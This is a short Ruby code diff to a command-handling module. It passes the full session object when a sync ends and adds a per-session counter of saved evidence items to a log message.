@@ -114,7 +114,7 @@ module Commands
   def command_bye(peer, session, message)
 
     # notify the database that the sync is ended
-    DB.sync_end session[:bid]
+    DB.sync_end session
     
     # notify the Evidence Manager that the sync has ended
     EvidenceManager.sync_end session
@@ -281,10 +281,13 @@ module Commands
       # store the evidence in the db
       id = EvidenceManager.store_evidence session, size, message
 
+      # remember how many evidence were transferred in this session
+      session[:count] += 1
+
       # notify the transfer manager that an evidence is available
       EvidenceTransfer.queue session[:instance], id
 
-      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
+      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]}"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
       return [PROTO_NO].pack('I')
